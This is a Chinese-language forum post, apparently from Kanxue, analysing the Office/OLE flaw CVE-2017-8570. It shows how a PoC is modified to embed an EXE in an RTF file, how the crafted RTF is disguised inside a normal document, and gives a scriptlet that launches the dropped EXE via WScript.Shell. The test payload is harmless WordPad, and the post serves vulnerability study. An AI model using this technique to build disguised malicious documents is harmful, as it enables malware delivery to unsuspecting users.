
## 0x01 漏洞概述

> POC:[CVE-2017-8570](https://bbs.kanxue.com/elink@6abK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5P5s2N6^5i4K6u0r3b7#2k6q4i4K6u0V1x3U0l9I4y4#2)9J5k6o6R3#2y4K6l9`.)

`CVE-2017-8570`实际上是一逻辑漏洞，该漏洞利用了`OLE`中`Composite Moniker`对象在组合`File Moniker`对象的过程中，未做安全性检查，以致可以直接运行`File Moniker`对象指定的`ScriptletFile(.sct)`脚本文件。

## 0x03 样本构造

部分样本是将`EXE`文件以`Package`对象的形式包含在RTF文档内：

![图片7 EXE](https://bbs.kanxue.com/upload/attach/202008/817966_ZV88U7XAXTYW74U.jpg)

之后通过`SCT`脚本去执行该`EXE`：

![图片8 SCT脚本](https://bbs.kanxue.com/upload/attach/202008/817966_U5GYJBWP4HA2BGT.jpg)

笔者针对此情况对原有POC进行了改造(具体见文末)：

![图片9 修改一](https://bbs.kanxue.com/upload/attach/202008/817966_45APRZZERHUNG5P.jpg)

![图片10 修改二](https://bbs.kanxue.com/upload/attach/202008/817966_XKUTJBBXUWQQ8YY.jpg)

![图片11 修改三](https://bbs.kanxue.com/upload/attach/202008/817966_5E7UJQEVYZD9SCS.jpg)

如此一来，便可将`EXE`文件以`Package`对象的形式嵌入到RTF文档中。

生成的RTF文档可以添加到正常RTF文档末尾`}`之前以进行伪装：

![图片12 伪装](https://bbs.kanxue.com/upload/attach/202008/817966_NMGE6N2HHKQ36JV.jpg)

笔者用以测试的`SCT`脚本如下：

```
<?XML version="1.0"?>

<scriptlet>



<registration

    description="fjzmpcjvqp"

    progid="fjzmpcjvqp"

    version="1.00"

    classid="{204774CF-D251-4F02-855B-2BE70585184B}"

    remotable="true"

    >

</registration>



<script language="JScript">

<![CDATA[



        var r = new ActiveXObject("WScript.Shell").Run("%temp%\\write.exe");





]]>

</script>



</scriptlet>

```

其中`write.exe`是`C:\Windows\System32`目录下的正常写字板程序。效果如图：

![图片13 效果图](https://bbs.kanxue.com/upload/attach/202008/817966_T662E74F6JUK2Q5.jpg)
